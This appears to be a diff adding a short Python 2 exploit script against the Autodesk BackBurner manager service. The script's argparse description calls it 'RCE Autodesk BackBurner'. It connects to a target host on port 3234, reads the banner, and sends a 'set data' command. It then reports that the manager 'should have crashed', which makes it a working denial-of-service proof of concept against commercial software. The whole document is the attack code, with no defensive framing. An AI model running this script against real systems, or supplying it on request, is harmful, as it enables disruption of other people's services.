@@ -1,0 +1,90 @@
+import sys
+import datetime
+import socket
+import argparse
+import os
+import time
+
+remote_host = ''
+remote_port = ''
+
+def callExit():
+	print "\n\t\t[!] exiting at %s .....\n" % datetime.datetime.now()
+	sys.exit(1)
+
+def mySocket():
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	except socket.error:
+		print 'Failed to create socket'
+		sys.exit()
+	
+	print "\n\t[+] Socket Created"
+	
+	s.connect((remote_host, remote_port))
+	print "\n\t[+] Socket Connected to %s on port %s" % (remote_host, remote_port)
+	
+	return s
+	
+# 250 backburner 1.0 Ready.
+def receiveBanner(s):
+	banner = s.recv(4096)
+	print banner
+
+
+def receiveData(s):
+	data = s.recv(4096)
+	print data
+
+
+def setDataCommand(s):
+    receiveData(s)			# backburner>
+    print "Set Data Command"
+    time.sleep(1)
+    command = "set data\r\n"
+    try:
+        s.sendall(command)
+    except socket.error:
+        print 'Send failed'
+        sys.exit()
+    print "BackBurner Manager should have crashed"
+    receiveData(s)			# 200 Help
+    receiveData(s)			# Available Commands:.....and all set of commands
+                            # backburner>
+
+
+def main():
+	if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
+		os.system('clear')
+
+	parser = argparse.ArgumentParser(description = 'RCE Autodesk BackBurner')
+	parser.add_argument('--host', nargs='?', dest='host', required=True, help='remote IP of Autodesk host')
+	parser.add_argument('--port', nargs='?', dest='port', default=3234, help='remote Port running manager.exe')
+	
+	args = parser.parse_args()
+	
+	if args.host == None:
+		print "\t[!] IP of remote host?"
+		sys.exit()
+	
+	global remote_host
+	global remote_port
+	
+	remote_host = args.host
+	remote_port = args.port
+	
+	print "remote_host: %s" % remote_host
+	print "remote_port: %s" % remote_port
+	
+	s = mySocket()
+	receiveBanner(s)
+	setDataCommand(s)
+	
+	print 'exit'
+	sys.exit()
+	
+	
+if __name__ == '__main__':
+	try: sys.exit(main())
+	except KeyboardInterrupt:
+		callExit()
